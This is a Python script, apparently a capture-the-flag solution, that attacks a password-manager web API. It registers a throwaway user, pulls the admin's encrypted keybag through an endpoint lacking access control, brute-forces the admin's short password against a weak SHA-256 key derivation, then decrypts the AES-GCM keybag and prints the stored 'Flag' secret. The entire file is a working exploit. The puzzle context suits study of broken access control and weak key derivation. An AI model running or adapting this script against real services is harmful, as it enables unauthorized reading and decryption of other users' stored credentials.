import requests
import json
import sys
import random
import string
import hashlib
import base64
import time
import itertools
import binascii
from Crypto.Cipher import AES


class KeyData:

    def __init__(self, salt, password, i=1):
        kd = self.xor(salt.encode(), password.encode())
        for i in range(i):
            kd = hashlib.sha256(kd).digest()
        self.key = kd
        self.keyhash = hashlib.sha256(kd).hexdigest()

    @staticmethod
    def xor(a, b):
        return bytes(x^y for x,y in zip(a, b))

    def __repr__(self):
        return '<Key: "{}", KeyHash: "{}">'.format(
                binascii.hexlify(self.key),
                self.keyhash,
                )


class Solver:

    def __init__(self, endpoint):
        self.endpoint = endpoint
        if self.endpoint[-1] == "/":
            self.endpoint = self.endpoint[:-1]
        self.token = None

    def post(self, path, data):
        headers = {
                'Content-type': 'application/json',
        }
        if self.token is not None:
            headers['X-Auth-Token'] = self.token
        resp = requests.post(self.endpoint+path, data=json.dumps(data),
                             headers=headers)
        resp.raise_for_status()
        return resp.json()

    def get(self, path):
        headers = {}
        if self.token is not None:
            headers['X-Auth-Token'] = self.token
        resp = requests.get(self.endpoint+path, headers=headers)
        resp.raise_for_status()
        return resp.json()

    def register_new_user(self):
        username = random_string()
        password = random_string()
        data = {
                "username": username,
                "password": password,
                "confirm": password,
        }
        resp = self.post("/api/register", data)
        if not resp["success"]:
            raise ValueError("register failed")
        self.token = resp["token"]

    def get_admin_keybag(self):
        return self.get("/api/keybag/history/admin/4")

    @staticmethod
    def split_keybag(kbdata):
        iv_len = 96//8
        kbbytes = base64.b64decode(kbdata)
        return kbbytes[:iv_len], kbbytes[iv_len:]

    @staticmethod
    def check_known_pass(keybag):
        key = KeyData("admin", "trans", i=keybag["iterations"])
        if keybag["keyhash"] != key.keyhash:
            raise ValueError("got keyhash {}, expected {}".format(
                key.keyhash, keybag["keyhash"]))
        return key

    @staticmethod
    def crack_keybag(keybag):
        start = time.time()
        salt = "admin"
        alpha = string.ascii_lowercase + string.digits
        combs = itertools.product(alpha, repeat=len(salt))
        i = 0
        try:
            for c in combs:
                i += 1
                k = KeyData(salt, ''.join(c), i=keybag["iterations"])
                if k.keyhash == keybag["keyhash"]:
                    print(''.join(c))
                    return k
        finally:
            end = time.time()
            print('Cracking time: {:0.2f} / {:d}'.format(end-start, i))

    @staticmethod
    def decrypt(iv, ctext, key):
        cipher = AES.new(key.key, mode=AES.MODE_GCM, nonce=iv)
        mac = ctext[-16:]
        ctext = ctext[:-16]
        return cipher.decrypt_and_verify(ctext, mac)

    def solve(self):
        self.register_new_user()
        keybag = self.get_admin_keybag()
        print(keybag)
        kd = self.check_known_pass(keybag)
        kd = self.crack_keybag(keybag)
        if not kd:
            print("No keyhash found!!")
            sys.exit(1)
        print(repr(kd))
        iv, ctext = self.split_keybag(keybag["keybag"])
        dec = self.decrypt(iv, ctext, kd)
        print(dec)
        keys = json.loads(dec)
        flag = None
        for k in keys:
            if k["title"] == "Flag":
                flag = k["password"]
        if flag is None:
            raise ValueError("no flag found")
        print(flag)

def main():
    if len(sys.argv) != 2:
        print('Usage: %s endpoint' % sys.argv[0])
        sys.exit(1)
    endpoint = sys.argv[1]
    solver = Solver(endpoint)
    solver.solve()


def random_string(l=12):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(l))


if __name__ == '__main__':
    main()
